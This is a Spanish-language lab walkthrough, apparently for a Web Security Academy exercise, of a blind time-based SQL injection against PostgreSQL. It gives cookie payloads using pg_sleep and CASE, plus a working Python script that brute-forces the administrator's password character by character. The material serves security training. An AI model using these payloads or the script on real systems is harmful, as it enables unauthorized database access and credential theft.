### **Blind SQL Time-Based en PostgreSQL**  

En este ataque, aprovechamos la inyección SQL para extraer información cuando no se muestran errores ni resultados visibles en la respuesta. En su lugar, medimos el tiempo que tarda el servidor en responder. Si una consulta inyectada provoca un retraso, significa que la condición evaluada es verdadera, lo que nos permite extraer información carácter por carácter.  

---

### **1. Verificación de inyección SQL**  

Para comprobar si el parámetro `TrackingId` es vulnerable, probamos inyectar comillas simples y otros caracteres que podrían alterar la consulta SQL.  

```
Cookie: TrackingId=1cP9I5rNyy22ENex' --> Devuelve 200 OK  
Cookie: TrackingId=1cP9I5rNyy22ENex'-- --> Devuelve 200 OK  
Cookie: TrackingId=1cP9I5rNyy22ENex'' --> Devuelve 200 OK  
```  

El hecho de que no devuelva errores sugiere que la aplicación maneja correctamente los fallos de sintaxis SQL.  

---

### **2. Identificación del motor de base de datos**  

Para determinar qué motor de base de datos está ejecutando la aplicación, probamos funciones específicas de cada uno.  

Primero intentamos con `sleep(5)`, que es común en MySQL:  

```
Cookie: TrackingId=1cP9I5rNyy22ENex' and sleep(5)--  
```  

Como la respuesta se devuelve inmediatamente, sabemos que **MySQL no está en uso**.  

En PostgreSQL, la función equivalente es `pg_sleep(x)`, así que probamos:  

```
Cookie: TrackingId=1cP9I5rNyy22ENex'||pg_sleep(10)--  
```  

La respuesta tarda **10 segundos**, lo que confirma que la inyección es posible y que el sistema utiliza **PostgreSQL**.  

---

### **3. Verificación de la existencia del usuario "administrator"**  

Una vez confirmado que se puede manipular la consulta SQL, probamos si el usuario **administrator** existe en la base de datos.  

Usamos `CASE` para condicionar la ejecución de `pg_sleep(10)`. Si el usuario existe, la consulta se retrasará 10 segundos; de lo contrario, la respuesta será inmediata.  

```
Cookie: TrackingId=1cP9I5rNyy22ENex'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--  
```  

Si el tiempo de respuesta es de **10 segundos**, el usuario **administrator** existe en la base de datos.  

---

### **4. Extracción de la contraseña del usuario "administrator"**  

Ahora que sabemos que el usuario existe, usamos una estrategia similar para extraer su contraseña **carácter por carácter**.  

Utilizamos `substring(password,1,1)` para extraer el primer carácter de la contraseña y verificamos si es igual a "a". Si es cierto, la consulta se retrasa 10 segundos; si no, la respuesta es inmediata.  

```
Cookie: TrackingId=1cP9I5rNyy22ENex'||(SELECT CASE WHEN substring(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--  
```  

Probamos con diferentes caracteres (`b, c, d, ..., 9`) hasta encontrar el correcto.  

Hacer esto manualmente sería muy lento, por lo que podemos automatizarlo con **Burp Suite (Cluster Bomb Attack)** o mediante un **script en Python**.  

---

### **Automatización con Python**  

Para extraer la contraseña de forma automatizada, usamos un **script en Python** que realiza fuerza bruta en cada carácter y mide el tiempo de respuesta del servidor.  

```python
#!/usr/bin/env python3

from pwn import *
import requests, signal, time, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo . . . ")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Configuración
main_url = "https://0ace00f30304bfb482b324f700230054.web-security-academy.net"
characters = string.ascii_lowercase + string.digits
cookies = {'session': 'aXldbnHwh9r2DHucOkZlJRLD68wDU8Vf'}

def makeAttack():
    password = ""
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando")
    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for char in characters:
            tracking_id = f"agiWv7ONBsULuQ3p'||(SELECT CASE WHEN substring(password,{position},1)='{char}' THEN pg_sleep(1.5) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')-- -"
            cookies['TrackingId'] = tracking_id

            time_start = time.time()
            requests.get(main_url, cookies=cookies)
            time_end = time.time()

            p1.status(f"Probando caracter {char} en la posición {position}")

            if time_end - time_start > 1.4:
                password += char
                p2.status(password)
                break

if __name__ == '__main__':
    makeAttack()
```

---

### **Explicación detallada del ataque**  

Este método permite extraer datos sin necesidad de verlos directamente en la respuesta del servidor. En su lugar, nos basamos en **diferencias en el tiempo de respuesta**.  

1. **Inyección SQL y manipulación de tiempos**  
   - Se usa `pg_sleep(x)` para generar retrasos en la respuesta.  
   - Si la condición evaluada es verdadera, la consulta se retrasa (`pg_sleep(10)`).  
   - Si es falsa, la consulta se ejecuta normalmente.  

2. **Extracción de información carácter por carácter**  
   - Se aplica `substring(password, X, 1)` para obtener el carácter en la posición `X`.  
   - Se prueba con diferentes caracteres (`a-z`, `0-9`) y se mide el tiempo de respuesta.  
   - Si la respuesta se retrasa, el carácter es correcto y se pasa al siguiente.  

3. **Automatización del ataque**  
   - Se implementa un **script en Python** que automatiza la prueba de cada carácter.  
   - Se utiliza la librería `pwntools` para mostrar el progreso en tiempo real.  
   - Se establece un umbral de tiempo (`>1.4 segundos`) para detectar caracteres correctos.  

Este ataque puede tardar varios minutos en completarse, dependiendo de la longitud de la contraseña y del tiempo de respuesta del servidor. Sin embargo, es altamente efectivo en entornos donde los errores de SQL están ocultos y la única forma de extraer datos es midiendo el tiempo de respuesta. 🚀
